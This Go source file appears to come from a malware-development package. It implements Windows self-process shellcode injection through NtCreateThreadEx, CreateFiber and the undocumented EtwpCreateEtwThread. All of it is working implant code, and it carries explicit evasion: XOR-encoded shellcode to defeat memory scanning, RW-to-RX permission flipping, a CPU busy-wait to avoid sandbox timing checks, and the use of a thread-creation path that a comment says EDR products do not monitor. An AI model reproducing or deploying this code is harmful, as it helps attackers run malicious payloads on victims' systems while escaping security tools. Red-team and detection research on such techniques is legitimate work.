//go:build windows

// Self-process injection methods: target is the implant's own process.
// CreateThread, CreateFiber, EtwpCreateEtwThread, plus the deprecated
// MethodDirectSyscall stub. Sibling files for remote-process and the
// rest of the package live alongside.

package inject

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// --- Method 2: CreateThread (self, with evasion) ---

func (w *windowsInjector) injectCreateThread(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. XOR encode shellcode (memory scan evasion)
	encoded, key, err := xorEncodeShellcode(shellcode)
	if err != nil {
		return fmt.Errorf("XOR encoding failed: %w", err)
	}

	// 2. Allocate with PAGE_READWRITE (less suspicious)
	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(encoded)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	// 3. Copy encoded shellcode
	api.ProcRtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&encoded[0])),
		uintptr(len(encoded)),
	)

	// 4. CPU delay (temporal evasion, avoids Sleep API)
	cpuDelay()

	// 5. Decode shellcode in place
	xorDecodeInPlace(addr, len(encoded), key)

	// 6. Change permissions to PAGE_EXECUTE_READ
	var oldProtect uint32
	err = windows.VirtualProtect(
		addr,
		uintptr(len(encoded)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("VirtualProtect failed: %w", err)
	}

	// 7. Create thread with NtCreateThreadEx (stealthier than CreateThread)
	var hThread uintptr
	currentProcess := ^uintptr(0) // -1 in uintptr

	status, _, _ := api.ProcNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		api.ThreadAllAccess,
		0,
		currentProcess,
		addr,
		0,
		0, 0, 0, 0, 0,
	)
	if status != 0 {
		return fmt.Errorf("NtCreateThreadEx failed: status 0x%X", status)
	}

	// 8. Wait briefly for thread to start (100ms).
	// NOTE: WaitForSingleObject does not support context.Context cancellation.
	// The Windows API has no interruptible wait that accepts a Go context.
	// The 100ms timeout bounds the blocking duration.
	api.ProcWaitForSingleObject.Call(hThread, 100)
	windows.CloseHandle(windows.Handle(hThread))

	w.record(addr, uintptr(len(encoded)))
	return nil
}


// --- Method 7: Direct Syscall ---

func (w *windowsInjector) injectDirectSyscall(shellcode []byte) error {
	return fmt.Errorf("legacy direct syscall path removed: use NewWindowsInjector with SyscallMethod: wsyscall.MethodDirect")
}

// --- Method 8: CreateFiber ---

func (w *windowsInjector) injectCreateFiber(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. Allocate and prepare memory (RW -> Copy -> RX)
	addr, err := allocateAndWriteMemoryLocalWithCaller(shellcode, nil)
	if err != nil {
		return fmt.Errorf("memory allocation failed: %w", err)
	}

	// 2. Convert current thread to Fiber
	mainFiber, _, err := api.ProcConvertThreadToFiber.Call(0)
	if mainFiber == 0 {
		return fmt.Errorf("ConvertThreadToFiber failed: %w", err)
	}

	// 3. Create a Fiber with shellcode as start function
	shellcodeFiber, _, err := api.ProcCreateFiber.Call(0, addr, 0)
	if shellcodeFiber == 0 {
		return fmt.Errorf("CreateFiber failed: %w", err)
	}

	// 4. Switch to shellcode Fiber (execution!)
	api.ProcSwitchToFiber.Call(shellcodeFiber)

	w.record(addr, uintptr(len(shellcode)))
	return nil
}

// --- Method 9: EtwpCreateEtwThread ---

// injectEtwpCreateEtwThread abuses the internal ntdll function EtwpCreateEtwThread
// to create a thread. This function is not monitored by most EDR products
// because it's an internal ETW mechanism, not a standard thread creation API.
func (w *windowsInjector) injectEtwpCreateEtwThread(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	// 1. Allocate RW memory
	addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("VirtualAlloc: %w", err)
	}

	// 2. Copy shellcode
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)

	// 3. Change to RX
	var oldProtect uint32
	if err := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect: %w", err)
	}

	// 4. Call EtwpCreateEtwThread(addr, 0) — creates a thread running at addr
	r, _, _ := api.ProcEtwpCreateEtwThread.Call(addr, 0)
	if r == 0 {
		return fmt.Errorf("EtwpCreateEtwThread failed")
	}

	w.record(addr, uintptr(len(shellcode)))
	return nil
}

